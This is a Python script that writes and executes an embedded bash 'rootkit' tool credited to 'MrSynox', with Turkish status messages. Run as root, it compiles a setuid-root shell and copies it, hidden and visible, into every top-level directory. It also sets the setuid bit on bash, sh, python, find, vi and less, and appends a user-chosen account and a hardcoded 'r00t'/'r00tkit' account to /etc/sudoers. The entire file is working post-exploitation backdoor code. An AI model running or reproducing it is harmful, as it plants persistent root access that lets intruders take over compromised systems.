import os
import sys
import subprocess
import string
import random

bashfile=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
bashfile='/tmp/'+bashfile+'.sh'

f = open(bashfile, 'w')
s = """#!/bin/bash

rampung='\\033[0m'
abang='\\033[1;31m'
ijo='\\033[1;34m'
kuning='\\033[1;33m'
putih='\\033[1;37m'


banner(){
echo -ne "$putih
	                                                            
       
    __  ___     ____              __ 
   /  |/  /____/ __ \____  ____  / /_
  / /|_/ / ___/ /_/ / __ \/ __ \/ __/
 / /  / / /  / _, _/ /_/ / /_/ / /_  
/_/  /_/_/  /_/ |_|\____/\____/\__/  
                                By MrSynox


$putih

\\n"
sleep 2
}

check_root(){
	uid=$(id -u)
	gid=$(id -g)
	echo "[+] User ID	: $uid"
	echo "[+] Group ID	: $uid"
	if [[ $uid == 0 ]]
	then
		echo -ne "$ijo[+] Root Onaylandi!\\n[+] Başlatiliyor..\\n\\n $rampung\\n"
		sleep 1
	else
		echo -ne "$abang[+] Root Onaylanmadi!\\n[+] Root Olarak Çaliştirilmalidir! $rampung\\n"
		exit
	fi
}

binary_rootkit(){

cat << EOF > /tmp/gsh.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

gcc /tmp/gsh.c -o /tmp/gsh
rm /tmp/gsh.c

}

share_binroot(){
	root_dir=$(ls /)
	mkdir /.,

	for i in $root_dir
	do
		if [[ -d /$i ]]
		then
			if [[ $i == tmp ]]
				then
					echo -ne "$ijo[+] Share rootkit in Directory : $i $rampung\\n"
					cp /tmp/gsh /$i/.gsh
					chmod +s /$i/gsh
					chmod +s /$i/.gsh
			else
				echo -ne "$ijo[+] Share rootkit in Directory : $i $rampung\\n"
				cp /tmp/gsh /$i/gsh
				cp /tmp/gsh /$i/.gsh
				chmod +s /$i/gsh
				chmod +s /$i/.gsh
			fi
		fi
	done
}

python_stickybit(){
	chmod +s /usr/bin/python
	chmod +s /usr/bin/python?
	chmod +s /usr/bin/python???

	root_py=$(ls /usr/bin/python /usr/bin/python? /usr/bin/python???)
	for i in $root_py
	do
		echo -ne "$ijo[+] Python Sürümüne Python Yapışkan Bit Ekleme : $i $rampung\\n"
	done
}

app_r00t(){
	echo -ne "$ijo[+] Yapışkan Bit Ekle find binary $rampung\\n"
	echo -ne "$ijo[+] Yapışkan Bit Ekle vi $rampung\\n"
	echo -ne "$ijo[+] Yapışkan Bit Ekle less $rampung\\n"
	echo -ne "$ijo[+] Yapışkan Bit Ekle Bash $rampung\\n"
	echo -ne "$ijo[+] Yapışkan Bit Ekle SH $rampung\\n"
	chmod +s /bin/bash
	chmod +s /bin/sh
	chmod +s /usr/bin/find
	chmod +s /usr/bin/vi
	chmod +s /usr/bin/less
	sleep 2
}



	


adduser_r00t(){
	echo -ne "\\n$putih[+] Root ile eşit Yeni Kullanıcı oluştur... $rampung\\n"
	read -p "[+] Username	: " username
	read -p "[+] Password	: " password 
	echo -ne "$password\\n$password\\n\\n\\n\\n" | adduser $username
	echo -ne "\\n$username	ALL=(ALL:ALL) ALL\\n" >> /etc/sudoers
	echo -ne "$putih[+] Root ile eşit Yeni Kullanıcı oluştur... \\n[+] Kullanıcı adınızı ve şifrenizi unuttuysaniz, bunu kullanabilirsiniz\\n[+] Username	: r00t\\n[+] Password	: r00tkit $rampung\\n"
	echo -ne "r00tkit\\nr00tkit\\n\\n\\n\\n\\n" | adduser r00t
	echo -ne "\\nr00t	ALL=(ALL:ALL) ALL\\n" >> /etc/sudoers
}
banner
check_root
binary_rootkit
share_binroot
python_stickybit
app_r00t
adduser_r00t

"""
f.write(s)
f.close()
os.chmod(bashfile, 0o755)
bashcmd=bashfile
for arg in sys.argv[1:]:
  bashcmd += ' '+arg
subprocess.call(bashcmd, shell=True)
